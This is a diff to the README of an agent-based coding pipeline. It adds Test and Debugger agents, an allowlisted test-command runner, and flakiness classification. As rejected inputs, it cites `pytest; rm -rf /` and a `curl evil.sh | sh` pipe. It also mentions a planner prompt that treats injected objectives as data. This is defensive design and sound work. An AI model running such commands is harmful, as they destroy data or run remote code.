@@ -39,6 +39,21 @@ Current milestone scope:
   result is unexpected here and audited as `developer.unexpected_denial` (distinct from
   Research's expected-denial case). Capabilities exclude `shell.*`/`github.*` — verification
   is a later phase's job. IMPLEMENTING → TESTING fires only after the summary is persisted.
+- **Phase 8 — Test + Debugger Agents**: the pass/fail and review/iterate branching becomes
+  real. The Test Agent (`shell.run_test`, the FIRST subprocess tool) runs the repository's
+  CONFIGURED test command — detected at discovery from setup-file markers, validated against
+  the `command_policy` allowlist at store time, with NO agent-input path into the command at
+  all (the input schema has no command field; `extra="forbid"` rejects smuggled args). It is
+  deterministic (Section 41): one real subprocess run, parsed exit code + pytest counts, no
+  LLM judgment. TESTING branches passed → REVIEWING / failed|error → DEBUGGING. The Debugger
+  Agent investigates read-only (propose → pipeline → observation → bounded → forced
+  classification), OBSERVES flakiness via exactly one re-run through the Test Agent (pass →
+  FLAKY_TEST → REVIEWING, never blocking the pipeline but never silently dropped), and
+  classifies CODE_FAILURE/TEST_FAILURE/ENVIRONMENT_FAILURE/DEPENDENCY_FAILURE/UNKNOWN with a
+  CONCRETE fix instruction. Fixable → IMPLEMENTING with `replan_count`+1 enforced at the
+  transition (`max_replans` exhausted → ESCALATED); unfixable → FAILED with the category
+  attached. Timeouts are status "error" (distinct from "failed") so a hung suite is never
+  confused with a clean failing exit code.
 
 ## Quick start
 
@@ -84,10 +99,10 @@ curl localhost:8000/health               # {"status": "ok"}
 ```bash
 pytest              # hermetic suite (SQLite, no services) — state machine, lifecycle, API,
                     # policy engine, path traversal (read + write), git runtime, planner,
-                    # research + developer agents
+                    # research + developer + tester + debugger agents
 pytest tests_e2e/   # end-to-end (needs Postgres + Redis up) — real worker pipeline, cancel,
                     # crash recovery (kill/restart), two-worker concurrency, research + developer
-                    # loops
+                    # + test/debugger loops (REAL subprocess test runs)
 ```
 
 Note: `tests_e2e/` spawns its OWN worker subprocesses on the same Postgres/Redis, so stop the
@@ -106,6 +121,9 @@ app/
                             schema + grounding cross-check, forced synthesis on budget exhaustion
     developer/              DeveloperAgent: bounded write-capable loop, one-commit contract,
                             ImplementationSummary schema + files-changed cross-check
+    tester/                 TestAgent: deterministic shell.run_test + pytest parser (no LLM)
+    debugger/               DebuggerAgent: read-only investigation + flakiness re-run +
+                            FailureClassification (category, root cause, fix instruction)
   api/routes/tasks.py       Task API: create/list/get/cancel/events
   capabilities/             Capability value objects + per-agent assignment (Section H)
   database/                 engine/session + Alembic migrations
@@ -122,15 +140,18 @@ app/
   models/                   SQLAlchemy models (Section-G schema) + ExecutionEvent + ToolCall
   policies/                 deterministic PolicyEngine + risk-default & explicit-deny rules
   repository/
-    discovery.py            clone-once cache + default-branch/base-commit resolution
+    discovery.py            clone-once cache + test-command detection/validation (Phase 8)
     file_access.py          worktree-scoped read/list/search/write — traversal-safe
   runtime/
     state_machine.py        Section-D legal-transition table — pure logic, no I/O
     task_lifecycle.py       transitions + events + stub driver + agent transitions
                             (advance_task_with_agents) with compare-and-swap re-check
   schemas/                  Pydantic request/response schemas
+  shell/
+    command_policy.py       test-command allowlist + argument validation (Phase 8)
+    runner.py               subprocess execution: arg list only, timeout, captured output
   tools/                    Tool ABC + registry + example tools + repository.* / git.* /
-                            filesystem.* tools
+                            filesystem.* / shell.* tools
   worker/
     queue.py                arq Redis settings + pool + enqueue helper
     jobs/advance_task.py    one job = one transition (PLANNING/RESEARCHING/IMPLEMENTING run
@@ -181,6 +202,43 @@ Example tools prove the paths: `example.echo` (executes), `example.read_file`
   system prompt declares them DATA, not instructions. Tests feed injection-style objectives
   and prove the injected payload can never become a persisted plan.
 - **Planner capabilities are structurally empty** — it cannot invoke any tool.
+
+## Test + Debugger Agents (Phase 8)
+
+- **`shell.run_test` — locked down by construction**: the tool's input schema has NO command
+  field. The command comes exclusively from `repositories.test_command`, detected at discovery
+  time from the repo's own setup files (`pyproject.toml`/`pytest.ini`/`package.json`/`go.mod`/
+  `Cargo.toml` → `pytest`/`npm test`/`go test`/`cargo test`), validated against the
+  `command_policy` allowlist when stored (a rejected value fails discovery loudly, never gets
+  stored), and re-validated by the runner before every execution. Malicious commands
+  (`pytest; rm -rf /`, `pytest && curl evil.sh | sh`) are rejected at the allowlist/metachar/
+  path-escape checks. Since there is no agent-input path into the command at all, injection is
+  provably impossible — the adversarial test proves there is nothing to inject into.
+- **Test Agent is deterministic** (Section 41): one `shell.run_test` call, parse the exit code
+  and pytest summary line, persist a `TestRun` (status passed/failed/error, counts, exit code,
+  duration, truncated output, `timed_out` flag). No LLM call anywhere in this agent. A hang
+  times out into `error` (never `failed`), so the Debugger can tell a hung suite from a clean
+  failing exit code. No validated `test_command` → a clear error at invocation, not a
+  confusing subprocess failure.
+- **TESTING branches for real**: `passed` → REVIEWING (`tests_passed`); `failed`/`error` →
+  DEBUGGING (`tests_failed`/`tests_error`). The old stub happy-path note is gone — this is the
+  phase where `next_status`'s pass/fail branch finally becomes real.
+- **Debugger: read-only, flakiness OBSERVED not guessed**: the Debugger re-runs the suite
+  EXACTLY ONCE via the Test Agent before classifying. If the re-run passes → FLAKY_TEST,
+  set deterministically (the LLM is never allowed to guess "flaky" from one run); the flake
+  is flagged in the trace (`debugger.flaky_detected`) and routed to REVIEWING as if TESTING
+  had passed. A re-run that fails DIFFERENTLY (timeout vs clean exit) is not "flaky" —
+  classified from the more informative run, inconsistency noted in `root_cause`.
+- **Classification drives the branching**: categories are CODE_FAILURE / TEST_FAILURE /
+  ENVIRONMENT_FAILURE / DEPENDENCY_FAILURE / FLAKY_TEST / UNKNOWN, with a CONCRETE
+  `fix_instruction` handed to the Developer's next run as DATA (never "fix the error").
+  `fixable=False` → FAILED with the category attached (an environment/dependency failure is
+  not something re-running the Developer fixes). Fixable → IMPLEMENTING with `replan_count`+1
+  — the budget is enforced AT THE TRANSITION (the Developer never sees it); exhausted →
+  ESCALATED, not another attempt.
+- **Denials are Research-style here**: the Debugger is read-only by contract, so a write
+  proposal is a benign mistake (absorbed as an observation, still audited
+  `debugger.unexpected_denial`) — NOT Developer-style unexpected behavior.
 
 ## Developer Agent (Phase 7)
 
@@ -271,8 +329,9 @@ its last persisted status; the worker's startup sweep re-enqueues it from there.
 Tables (architecture doc section G, milestone scope): `tasks`, `plans` (incl.
 `raw_llm_output`), `plan_steps`, `task_steps`, `capabilities`, `policies`, `audit_logs`,
 `repositories` (incl. `local_clone_path`), `worktrees`, `execution_events`, `tool_calls`,
-`research_artifacts`, `implementation_summaries`. Remaining Section-G tables arrive with the
-phases that use them (agents/eval). Tasks default to a bounded replan budget
+`research_artifacts`, `implementation_summaries`, `test_runs`, `failures`,
+`failure_classifications`. Remaining Section-G tables arrive with the phases that use them
+(agents/eval). Tasks default to a bounded replan budget
 (`max_replans=3`) — Section D's "budget exhausted → ESCALATED" is enforced even when the API
 client sets no budget.
 
@@ -281,5 +340,8 @@ client sets no budget.
 - Secrets come from `.env` only; connection strings are logged redacted.
 - Startup fails fast if the DB is unreachable — no silent hangs.
 - The worker uses the same env-driven config as the API — no new secret surface.
-- No shell execution; file writes are confined to the task's worktree (traversal-rejected),
-  never outside the repo; no external network calls yet.
+- Shell execution is confined to ONE tool (`shell.run_test`) running the repository's
+  allowlist-validated test command as an argument list (never `shell=True`) with a hard
+  timeout and captured output — there is no agent-input path into the command at all; file
+  writes are confined to the task's worktree (traversal-rejected), never outside the repo;
+  no external network calls yet.
